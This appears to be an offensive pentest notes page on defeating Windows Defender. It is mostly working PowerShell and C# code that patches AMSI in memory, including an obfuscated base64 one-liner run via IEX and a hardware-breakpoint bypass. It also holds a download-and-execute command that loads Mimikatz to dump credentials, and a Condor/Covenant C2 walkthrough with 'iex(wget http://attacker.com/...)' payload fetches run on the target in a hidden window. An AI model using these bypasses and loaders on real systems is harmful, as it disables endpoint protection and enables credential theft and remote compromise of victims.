# Windows Defender

## AMSI Bypass

If you need to run some Powershell command that is being blocked by AMSI, try running this command to get around it:

![](<../Windows Defender/Images/amsi\_bypass3.png>) https://gist.githubusercontent.com/FatRodzianko/c8a76537b5a87b850c7d158728717998/raw/36103d12eec662d532c9127f2396bc347d13c3c5/my-am-bypass.ps1

You can base64 encode the command to be one line. Use CyberChef to encode the code to base64.

![](<../Windows Defender/Images/amsi\_bypass2.png>) CyberChef URL:

https://icyberchef.com/#recipe=To\_Base64('A-Za-z0-9%2B/%3D')\&input=JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp

Command:

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFdpbjMyID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgV2luMzIgewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cgp9CiJACgpBZGQtVHlwZSAkV2luMzIKJHRlc3QgPSBbQnl0ZVtdXSgweDYxLCAweDZkLCAweDczLCAweDY5LCAweDJlLCAweDY0LCAweDZjLCAweDZjKQokTG9hZExpYnJhcnkgPSBbV2luMzJdOjpMb2FkTGlicmFyeShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHRlc3QpKQokdGVzdDIgPSBbQnl0ZVtdXSAoMHg0MSwgMHg2ZCwgMHg3MywgMHg2OSwgMHg1MywgMHg2MywgMHg2MSwgMHg2ZSwgMHg0MiwgMHg3NSwgMHg2NiwgMHg2NiwgMHg2NSwgMHg3MikKJEFkZHJlc3MgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTG9hZExpYnJhcnksIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkdGVzdDIpKQokcCA9IDAKW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJEFkZHJlc3MsIFt1aW50MzJdNSwgMHg0MCwgW3JlZl0kcCkKJFBhdGNoID0gW0J5dGVbXV0gKDB4MzEsIDB4QzAsIDB4MDUsIDB4NzgsIDB4MDEsIDB4MTksIDB4N0YsIDB4MDUsIDB4REYsIDB4RkUsIDB4RUQsIDB4MDAsIDB4QzMpCiMwOiAgMzEgYzAgICAgICAgICAgICAgICAgICAgeG9yICAgIGVheCxlYXgKIzI6ICAwNSA3OCAwMSAxOSA3ZiAgICAgICAgICBhZGQgICAgZWF4LDB4N2YxOTAxNzgKIzc6ICAwNSBkZiBmZSBlZCAwMCAgICAgICAgICBhZGQgICAgZWF4LDB4ZWRmZWRmCiNjOiAgYzMgICAgICAgICAgICAgICAgICAgICAgcmV0IApbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJEFkZHJlc3MsICRQYXRjaC5MZW5ndGgp")) | IEX
```

### Execution

![](<../Windows Defender/Images/amsi\_bypass1.png>)

## Defeating Windows Defender & Bypassing Amsi And Running Mimikatz

### Execution

![](<../Windows Defender/Images/wd+amsi\_bypass\_mimikatz.png>)

Command:

```
iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
```

## AMSI Bypass Using Hardware Breakpoints (by [EthicalChaos](https://twitter.com/_EthicalChaos))

```
$HardwareBreakpoint = @"
// Technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
// Original Code by @d_tranman: https://twitter.com/d_tranman/status/1628954053115002881
// Slight modifications by @ShitSecure for Powershell runtime compitability as the original code could not be used like this. Also the removal of the Hardware breakpoint was removed, so that every following future Powershell command bypasses AMSI as well.

using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Test
{
    // CCOB IS THE GOAT
   
    public class Program
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void SetupBypass()
        {

            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            // Saving our context to a struct
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);

            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);

        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
                //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
                //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }
        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {

            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            //Set bits 16-31 as 0, which sets
            //DR0-DR3 HBP's for execute HBP
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);

            //Set DRx HBP as enabled for local mode
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            // Now copy the changed ctx into the original struct
            Marshal.StructureToPtr(ctx, pCtx, true);
        }
        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }
    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}


"@

Add-Type -TypeDefinition $HardwareBreakpoint

[Test.Program]::SetupBypass()
```

## AMSI Bypass (by [am0nsec](https://twitter.com/am0nsec))

```
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
```

## Using condor tool + AMSI bypass + Covenant C2

The [condor](https://github.com/MrEmpy/Condor) tool is used for evasion of protection like AVs/EDRs/XDRs. You can use it to combo an AMSI bypass and a C2 like Covenant.

1. On the attacker's machine, create a folder where there will be two powershell scripts, one to bypass AMSI and another for the target to connect with C2.

bypass.ps1

```
# TLDR:
# iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
#
# @author Pichaya Morimoto (p.morimoto@sth.sh)
# One Shot for M1m1katz PowerShell Dump All Creds with AMSI Bypass 2022 Edition
# (Tested and worked on Windows 10 x64 patched 2022-03-26)
#
# Usage:
# 1. You need a local admin user's powershell with Medium Mandatory Level (whoami /all)
# 2. iex(wget https://gist.githubusercontent.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/4cee3d04127ca304bb04c9d95f3146eb7e9985a8/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
# or
# iex(wget https://attacker-local-ip/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
#
# AMSI Bypass is copied from payatu's AMSI-Bypass (23-August-2021)
# https://payatu.com/blog/arun.nair/amsi-bypass
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);

}
"@

Add-Type $code

$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)


# nishang - 2.2.0 (Jul 24, 2021)
# Change this to "attacker-local-ip" for internal sources

iex(wget http://attacker.com/exec.ps1 -UseBasicParsing)
```

[Reference](https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093)

On the last line where there is the `wget` command, put the IP of the attacker's machine where it will contain the two files (bypass.ps1 and exec.ps1)

1. Go to Covenant and generate a powershell payload

![](<../Windows Defender/Images/genpscovenant1.png>)

![](<../Windows Defender/Images/genpscovenant2.png>)

The payload will look like this:

exec.ps1

```
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7Vp7cFzle...
```

1. Now create a file called exec.ps1 and paste the modified payload
2. Open an HTTP port so the target can connect to it and run bypass.ps1

![](<../Windows Defender/Images/httpopencovenant.png>)

1. Run the following command using the condor tool:

```
python3 condor.py -p windows/x64/exec
```

1. Paste the following command:

```
powershell -Sta -Nop -Window Hidden -Command "iex(wget http://attacker.com/bypass.ps1 -UseBasicParsing)"
```

Substitute "attacker.com" for the ip of the attacker's machine.

1. After generating the EXE, run it on the target machine.

![](<../Windows Defender/Images/covenantpoc1.png>)

![](<../Windows Defender/Images/covenantpoc2.png>)
